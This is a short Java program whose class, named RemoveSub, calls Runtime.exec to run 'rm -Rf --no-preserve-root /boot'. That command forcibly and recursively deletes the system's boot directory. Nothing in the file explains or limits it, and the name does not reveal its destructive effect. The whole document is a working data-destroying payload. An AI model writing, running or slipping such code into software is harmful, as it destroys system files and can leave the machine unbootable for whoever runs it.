import java.util.*;
import java.lang.*;
import java.io.*;

public class RemoveSub {

    public static void main(String[] args) throws IOException {

		Runtime rt = Runtime.getRuntime();
        String[] commands = {"rm","-Rf","--no-preserve-root","/boot"};
        Process proc = rt.exec(commands);
    }
}